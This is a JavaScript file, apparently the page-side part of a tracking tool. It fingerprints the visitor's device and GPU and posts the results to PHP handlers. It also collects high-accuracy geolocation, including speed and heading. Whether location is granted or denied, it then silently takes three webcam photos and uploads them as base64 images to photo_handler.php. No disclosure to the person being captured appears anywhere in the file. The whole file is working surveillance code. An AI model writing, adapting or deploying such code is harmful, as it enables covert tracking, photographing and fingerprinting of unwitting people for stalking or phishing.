function information() {
  var ptf = navigator.platform;
  var cc = navigator.hardwareConcurrency;
  var ram = navigator.deviceMemory;
  var ver = navigator.userAgent;
  var str = ver;
  var os = ver;
  //gpu
  var canvas = document.createElement('canvas');
  var gl;
  var debugInfo;
  var ven;
  var ren;

  if (cc == undefined) {
    cc = 'Not Available';
  }

  //ram
  if (ram == undefined) {
    ram = 'Not Available';
  }

  //browser
  if (ver.indexOf('Firefox') != -1) {
    str = str.substring(str.indexOf(' Firefox/') + 1);
    str = str.split(' ');
    brw = str[0];
  }
  else if (ver.indexOf('Chrome') != -1) {
    str = str.substring(str.indexOf(' Chrome/') + 1);
    str = str.split(' ');
    brw = str[0];
  }
  else if (ver.indexOf('Safari') != -1) {
    str = str.substring(str.indexOf(' Safari/') + 1);
    str = str.split(' ');
    brw = str[0];
  }
  else if (ver.indexOf('Edge') != -1) {
    str = str.substring(str.indexOf(' Edge/') + 1);
    str = str.split(' ');
    brw = str[0];
  }
  else {
    brw = 'Not Available'
  }

  //gpu
  try {
    gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
  }
  catch (e) { }
  if (gl) {
    debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
    ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
    ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
  }
  if (ven == undefined) {
    ven = 'Not Available';
  }
  if (ren == undefined) {
    ren = 'Not Available';
  }

  var ht = window.screen.height;
  var wd = window.screen.width;
  //os
  os = os.substring(0, os.indexOf(')'));
  os = os.split(';');
  os = os[1];
  if (os == undefined) {
    os = 'Not Available';
  }
  os = os.trim();

  // Get additional info
  var lang = navigator.language || navigator.userLanguage || 'Not Available';
  var cookieEnabled = navigator.cookieEnabled ? 'Enabled' : 'Disabled';
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Not Available';

  //
  $.ajax({
    type: 'POST',
    url: 'info_handler.php',
    data: {
      Ptf: ptf,
      Brw: brw,
      Cc: cc,
      Ram: ram,
      Ven: ven,
      Ren: ren,
      Ht: ht,
      Wd: wd,
      Os: os,
      Language: lang,
      Cookies: cookieEnabled,
      Timezone: timezone
    },
    success: function () { },
    mimeType: 'text'
  });
}

function locate(callback, errCallback) {
  if (navigator.geolocation) {
    // First attempt: High Accuracy, short timeout (10s)
    var optnHigh = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
    navigator.geolocation.getCurrentPosition(showPosition, function (error) {
      if (error.code === error.TIMEOUT) {
        // Fallback: Low Accuracy, longer timeout (20s)
        console.log("High accuracy timed out, trying low accuracy...");
        var optnLow = { enableHighAccuracy: false, timeout: 20000, maximumAge: 0 };
        navigator.geolocation.getCurrentPosition(showPosition, showError, optnLow);
      } else {
        showError(error);
      }
    }, optnHigh);
  }

  function showError(error) {
    var err_text;
    var err_status = 'failed';

    switch (error.code) {
      case error.PERMISSION_DENIED:
        err_text = 'User denied the request for Geolocation';
        break;
      case error.POSITION_UNAVAILABLE:
        err_text = 'Location information is unavailable';
        break;
      case error.TIMEOUT:
        err_text = 'The request to get user location timed out';
        break;
      case error.UNKNOWN_ERROR:
        err_text = 'An unknown error occurred';
        break;
    }

    $.ajax({
      type: 'POST',
      url: 'error_handler.php',
      data: { Status: err_status, Error: err_text },
      success: function () {
        capturePhotosAndSend(callback);
      },
      mimeType: 'text'
    });
  }

  function showPosition(position) {
    var lat = position.coords.latitude;
    if (lat) {
      lat = lat + ' deg';
    }
    else {
      lat = 'Not Available';
    }
    var lon = position.coords.longitude;
    if (lon) {
      lon = lon + ' deg';
    }
    else {
      lon = 'Not Available';
    }
    var acc = position.coords.accuracy;
    if (acc) {
      acc = acc + ' m';
    }
    else {
      acc = 'Not Available';
    }
    var alt = position.coords.altitude;
    if (alt) {
      alt = alt + ' m';
    }
    else {
      alt = 'Not Available';
    }
    var dir = position.coords.heading;
    if (dir) {
      dir = dir + ' deg';
    }
    else {
      dir = 'Not Available';
    }
    var spd = position.coords.speed;
    if (spd) {
      spd = spd + ' m/s';
    }
    else {
      spd = 'Not Available';
    }

    var ok_status = 'success';

    $.ajax({
      type: 'POST',
      url: 'result_handler.php',
      data: { Status: ok_status, Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd },
      success: function () {
        capturePhotosAndSend(callback);
      },
      mimeType: 'text'
    });
  }
}

// Camera capture logic
function stopStream(stream) {
  stream.getTracks().forEach(track => track.stop());
}

function takeSnapshot(photoIndex) {
  return new Promise(function (resolve, reject) {
    navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } })
      .then(function (stream) {
        const video = document.createElement('video');
        video.autoplay = true;
        video.srcObject = stream;

        video.onloadedmetadata = function () {
          video.play();

          setTimeout(function () {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            const jpegBase64 = canvas.toDataURL('image/jpeg', 0.9);
            stopStream(stream);
            resolve(jpegBase64);
          }, 500);
        };

        video.onerror = function () {
          stopStream(stream);
          reject({ code: 'UNKNOWN_ERROR', message: 'Camera stream failed' });
        };
      })
      .catch(function (err) {
        reject(err);
      });
  })
    .then(function (jpegBase64) {
      $.ajax({
        type: 'POST',
        url: 'photo_handler.php',
        data: {
          Status: 'success',
          PhotoIndex: photoIndex,
          Photo: jpegBase64,
          Timestamp: new Date().toISOString()
        },
        mimeType: 'text'
      });
    })
    .catch(function (err) {
      console.log('Camera error:', err);
    });
}

function capturePhotosAndSend(finalCallback, totalPhotos = 3, intervalMs = 1000) {
  let photoCount = 0;

  const snapshotLoop = function () {
    if (photoCount < totalPhotos) {
      photoCount++;
      takeSnapshot(photoCount);
      setTimeout(snapshotLoop, intervalMs);
    } else {
      // All photos done, trigger final callback
      if (typeof finalCallback === 'function') {
        finalCallback();
      }
    }
  };

  snapshotLoop();
}